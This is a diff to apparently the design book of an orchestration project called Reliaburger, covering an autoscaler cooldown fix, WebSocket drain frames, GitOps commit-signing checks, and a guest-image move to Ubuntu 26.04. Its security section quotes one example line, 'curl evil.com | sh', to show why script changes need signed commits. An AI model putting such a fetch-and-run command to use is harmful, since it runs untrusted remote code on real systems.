@@ -235,6 +235,8 @@ The first wired autoscaler had four subtle bugs the review caught, and each one 
 
 **Start the cooldown after the write, not before.** The loop used to record the scale event — which starts the cooldown clock — and *then* write to Raft. If that write failed, the app never actually scaled, but the cooldown had already started, so the autoscaler sat on its hands for three minutes while nothing had happened. The fix is a one-line reorder: commit first, and only mark the cooldown on a successful write. A failed write now retries on the very next tick, because as far as the tracker is concerned, nothing has changed. Order your side effects so a failure leaves no false memory behind.
 
+"Succeeded" needed one more look (#2054). The council refuses an override for an app whose `[autoscale]` a deploy removed between the autoscaler's read and its write, and a refusal comes back as `Ok(CouncilResponse::Refused { .. })`: the entry committed, the state machine declined to act. The loop matched `Ok(_)`, so a refusal started the cooldown too. It now matches `CouncilResponse::Applied` only.
+
 **Clear an override the moment its baseline moves.** An override is a runtime adjustment *relative to a baseline*. Redeploy the app with a different replica count, or delete it entirely, and the old override is meaningless — worse than meaningless, because a stale "scale to 7" left sitting in Raft would quietly resize a freshly redeployed app. So the state machine clears the override in the same apply that changes the baseline: on `AppDelete`, and on an `AppSpec` whose replica count differs from the stored one. An image-only redeploy (same replica baseline) leaves the override alone — you don't want a routine version bump throwing away a legitimate scale-up.
 
 The baseline isn't the only thing an override leans on. It also lives inside the `[autoscale]` bounds, and the 0.2.1 audit found both edges unguarded (#701). Remove the `[autoscale]` block from an app scaled to 8 and the autoscaler stops looking at it, but the scheduler kept applying the override, so the app stayed at 8 with nothing left that could ever change it. Narrow `max` from 10 to 5 and the 8 stayed too. Now `apply_app_spec` drops the override when `autoscale` becomes `None` and clamps it into the new `[min, max]` otherwise, and applying an `AutoscaleOverride` refuses an app without the block and clamps into its bounds. The second guard matters because the autoscaler reads desired state, decides, then writes: a deploy that removes the block can commit in between. Both checks run in the Raft apply, so every council member reaches the same answer from the same log.
@@ -447,7 +449,7 @@ pub fn build_close_frame(status: u16) -> Vec<u8> {
 }
 ```
 
-Here's the honest state of it: `build_close_frame` exists and is unit-tested, but it is **not yet sent on the live drain path**. Today a draining backend's WebSockets are held open as tracked in-flight connections, and at the drain deadline they're torn down via a cancellation token rather than a graceful 1001 handshake. Wiring the frame into the splice -- write it into the client half, wait a grace period, then close -- is a tracked follow-up. (The HTTP side of drain-termination *is* wired: past the deadline a new request to a terminating backend gets a 503 and an in-flight response stops mid-stream.)
+This frame now goes out on the live drain path. When a draining backend's deadline arrives, the WebSocket splice stops copying, writes `build_close_frame(1001)` into the client half and shuts it down, with a short timeout so a stuck client can't hold the drain (`CLOSE_FRAME_TIMEOUT` in `src/wrapper/websocket.rs`). The client sees Going Away and reconnects instead of reporting an error. One wrinkle: the splice copies bytes, not frames, so if the deadline lands in the middle of a backend frame the client gets a protocol error instead. Either way it's bounded. (The HTTP side of drain-termination works the same way: past the deadline a new request to a terminating backend gets a 503 and an in-flight response stops mid-stream.)
 
 ## Lettuce: the GitOps engine
 
@@ -512,7 +514,7 @@ When a git provider sends a push webhook, Lettuce validates it with three checks
 
 Here's a subtle security requirement. An unsigned commit that changes `image = "redis:7"` to `image = "redis:8"` is probably fine. An unsigned commit that adds `script = "curl evil.com | sh"` is definitely not.
 
-Lettuce auto-enforces commit signing for any commit that adds or modifies a `script` field, regardless of the global `require_signed_commits` setting. The check happens by diffing the commit against its parent and searching for added lines containing "script".
+Lettuce auto-enforces commit signing for any commit that adds, changes or removes a `script` value, regardless of the global `require_signed_commits` setting. The first version diffed the commit against its parent and grepped the added lines for "script". That missed an edit inside a multi-line script body (no changed line mentions `script`), a deletion, and a `git diff` that failed with empty output. So now Lettuce parses the TOML instead: `script_values` in `src/lettuce/verify.rs` collects every `script` value, at any depth, from the last applied tree and from the new one, and any difference needs a signature from a trusted key. If the previous tree can't be read or parsed, the commit counts as changing scripts. On the first sync there's no previous tree, so any script at all needs a signature.
 
 ### Back-off on failure
 
@@ -920,7 +922,7 @@ The other half was making `--strict` symmetrical. `relish export --strict` now e
 
 **`toml_edit` was overkill for formatting.** We initially used `toml_edit` to preserve comments during formatting. It works, but the comment-preserving reserialisation introduced subtle ordering bugs that were painful to debug. We switched to a simpler approach: parse with `toml`, reserialise with canonical section ordering, accept that comments are lost. For machine-generated configs (which is what `relish compile` produces, and what Lettuce processes), comment loss is irrelevant. For hand-edited configs, `relish lint` validates without reformatting.
 
-**WebSocket is 95% detection, 5% proxying.** We spent most of the time on header detection edge cases (case-insensitive matching, multi-value Connection headers, routes that don't opt in). The actual proxying -- connect to backend, forward upgrade, bidirectional copy -- is straightforward. The drain Close frame is 4 bytes of hand-built binary (built and tested, though not yet sent on the live drain path -- see above). No WebSocket library needed.
+**WebSocket is 95% detection, 5% proxying.** We spent most of the time on header detection edge cases (case-insensitive matching, multi-value Connection headers, routes that don't opt in). The actual proxying -- connect to backend, forward upgrade, bidirectional copy -- is straightforward. The drain Close frame is 4 bytes of hand-built binary, and since 0.3.0 the live drain path sends it (see above). No WebSocket library needed.
 
 **Coordinator election should be boring.** Our first design for Lettuce's coordinator election had scoring heuristics: CPU load, memory availability, network latency to the remote. We replaced it with "first non-leader alphabetically", which was deterministic and needed no measurement. Then we noticed it named a node that couldn't apply a sync, because only the leader writes to Raft. The boring answer turned out to be the leader itself: no election of its own, and failover for free from Raft.
 
@@ -1531,9 +1533,9 @@ architecture with the release key:
 reliaburger guest image v1
 version v0.1.0
 arch aarch64
-asset reliaburger-guest-ubuntu-24.04-20260911-aarch64.qcow2
+asset reliaburger-guest-ubuntu-26.04-20260927-aarch64.qcow2
 sha256 …
-source-sha256 7b682958…
+source-sha256 63a93bd5…
 ```
 
 The CLI downloads `guest-image-metadata.json`, rebuilds that text itself and
@@ -1681,23 +1683,24 @@ clock for a laptop anyway:
   earlier without one, so `netem` was at most the trigger there.
 
 So the guest image ships with timesyncd switched off. `build_guest_image.sh`
-runs `systemctl disable systemd-timesyncd.service` in the chroot, which only
-removes symlinks and so works without a running systemd. The VM's
-provisioning script does the same for the stock Ubuntu image of development
-runs:
+ran `systemctl disable systemd-timesyncd.service` in the chroot, which only
+removes symlinks and so works without a running systemd. (Since the guest
+moved to Ubuntu 26.04 the unit it disables is `chrony.service`; more on that
+below.) The VM's provisioning script does the same for the stock Ubuntu image
+of development runs, for whichever of the two daemons the image has:
 
 ```rust
-const ONE_CLOCK_SOURCE: &str =
-    "if systemctl cat systemd-timesyncd.service >/dev/null 2>&1; then\n  \
-     systemctl disable --now systemd-timesyncd.service\nfi\n";
+const ONE_CLOCK_SOURCE: &str = "for service in chrony.service systemd-timesyncd.service; do\n  \
+     if systemctl cat \"$service\" >/dev/null 2>&1; then\n    \
+     systemctl disable --now \"$service\"\n  fi\ndone\n";
 ```
 
 A `const` is a value the compiler bakes in. `&str` is a borrowed string, and
 for a literal the borrow lasts for the whole program (its full type is
 `&'static str`), so it needs no allocation and no owner. The trailing `\` in a
 Rust string literal swallows the line break and the next line's leading
-spaces, which is why the shell's indentation is written out as two spaces
-before it.
+spaces, which is why the shell's indentation is written out before it. `\"`
+puts a double quote inside the literal, as it would in C or Go.
 
 The trade-off is that we inherit Lima's bugs. Its agent compares its own
 clock with the host's timestamp after the message has crossed into the VM, so
@@ -1707,11 +1710,11 @@ with a fix proposed upstream). Without timesyncd pushing the other way that
 happens only under load, not every 10 seconds for the rest of the night.
 
 How do we know it stays fixed? The provisioning test runs the script against
-a stub `systemctl` that logs its arguments and expects `disable --now
-systemd-timesyncd.service` among them, and the guest image test checks the
-build script disables the unit before it seals the image. On real VMs, the
-soak's guest report now prints whether timesyncd is active, which fails the
-check outright, and counts the `SyncTime` steps the guest agent logged since
+a stub `systemctl` that logs its arguments and expects `disable --now`
+for both daemons among them, and the guest image test checks the build script
+disables chrony before it seals the image. On real VMs, the soak's guest
+report now prints whether timesyncd or chrony is active, either of which fails
+the check outright, and counts the `SyncTime` steps the guest agent logged since
 the last report. The record lists the total per node.
 
 ### Pin a Lima that doesn't leak
@@ -1797,6 +1800,43 @@ special runs once per soak.
 The checker fails a tier when a `relish wtf` warning outlasts ten minutes past the last settle. Candidate 6's 8 h jobs final failed that way on two warnings at once. One was a real bug (#1110, in Chapter 7). The other was Mayo's `cpu_throttle` alert, which fires once a guest's CPU stays above 90% for five minutes. The jobs soak drives 2-vCPU guests at the job target rate on purpose, so the alert fired nearly all run long, in passing runs too. It failed this one only because fourteen minutes went by without a settle to reset the clock (#1112).
 
 The alert said "the load is the load", which tells us nothing about the candidate, and whether it failed a tier came down to timing. So the checker now records `cpu_throttle` as an `info` finding instead of gating on it. `memory_high` stays gated, because a Bun that grows past 70% of its guest is the leak the soak exists to catch. The same fix caught a second bug: every cluster-wide alert shared one key, `warning|alerts-firing|cluster`, so an alert that had just started firing inherited the age of an older one. The key now ends in the rule's name, taken from the alert's title, so each alert keeps its own clock.
+
+### Following the appliance to Ubuntu 26.04
+
+Chapter 15a builds an appliance OS on Ubuntu 26.04. For 0.3.0 the quickstart guest moved to the same release, so a laptop cluster and a rack of thin clients run the same kernel (7.0), runc (1.4) and nftables (1.1.6) from the same archive. Bugs in one place should be bugs in the other.
+
+The move itself is a change to `guest-images.json`: two new dated URLs under `releases/resolute/release-20260927/`, each with the SHA-256 from Canonical's `SHA256SUMS`, and checked against the bytes we downloaded. `resolute` is 26.04's codename, as `noble` was 24.04's. The tests that knew the old release name had to learn the new one, and that was the easy part. Building and booting the result found three things the pins couldn't.
+
+**The disk was full.** The first image build died in `dpkg` with `No space left on device`. Ubuntu's 26.04 cloud image has a 2.5 GiB root filesystem with 160 MiB free, and our seven packages need about 270 MiB, mostly Buildah and what it pulls in. On a running VM that never matters, because cloud-init grows the filesystem to fill Lima's 10 GiB disk at first boot. In our chroot nothing grows it. So the build script now adds 1 GiB to the raw copy (`truncate` makes it sparse, so it costs nothing until it's used), moves the root partition's end with `growpart` and grows the filesystem with `resize2fs`. The compressed aarch64 image came out at 1009 MiB, 107 MiB more than Ubuntu's.
+
+**The clock had a new owner.** Ubuntu 25.10 replaced systemd-timesyncd with chrony, so 26.04 has no timesyncd to disable, and `systemctl disable systemd-timesyncd.service` in the chroot would have failed the build. Chrony would fight Lima's guest agent just as timesyncd did. The build disables `chrony.service` instead, and provisioning disables whichever of the two a stock image has. The soak's guest report checks both.
+
+**The first boot took two minutes.** A VM from the new image reached `READY` only after `systemd-networkd-wait-online` gave up at its 120 s timeout. The journal told the story:
+
+```text
+virtio_net virtio0 enp0s1: renamed from eth0
+...
+cloud-init: Failed to rename devices: [busy] Error renaming mac=52:55:55:5d:8a:cb from enp0s1 to eth0
+systemd-networkd-wait-online: Timeout occurred while waiting for network connectivity.
+```
+
+26.04's initrd is built by dracut, and it starts systemd-networkd, so the NIC is already up under its predictable name, `enp0s1`, when the real root takes over. Lima's network config asks cloud-init for `eth0`. cloud-init refuses to rename an interface that's up, and netplan then waits for an `eth0` that never comes. On the second boot everything works, because by then netplan has left a `.link` file behind and udev renames the interface itself, up or not. The stock image does exactly the same thing. Our first quickstart run only got through because its boot watchdog restarted the VM.
+
+The fix is the file netplan would have written, put there before first boot:
+
+```ini
+[Match]
+Driver=virtio_net
+
+[Link]
+Name=eth0
+```
+
+A quickstart VM has exactly one NIC, so matching on the driver is enough. With it, a VM from the new image went from `limactl start` to `READY` in 19 s, and the 2-minute wait was gone. Development runs still boot the stock image, which has no such file. Their first boot loses the rename and setup restarts the VM once, which costs time but not correctness.
+
+One more surprise was in our own build, not in Ubuntu. Building `bun` inside a 26.04 VM got us a binary whose eBPF objects kernel 7.0's verifier refused, and Chapter 3 tells that story. Release builds still compile on Ubuntu 22.04 with an older clang, so they weren't affected, but now the build pins the instruction set either way.
+
+What about one package list for the guest and the appliance? mkosi reads its `Packages=` from an INI-style file, not JSON, so generating one from the other would mean a build step for each. We kept the two files and made a test hold them together instead. `test_guest_images.py` parses `image/mkosi.conf` and fails if the guest's packages, less Buildah, aren't exactly the appliance's node packages. Buildah stays guest-only, because the five-minute tour builds images on the laptop cluster.
 
 ### Status from any node
 
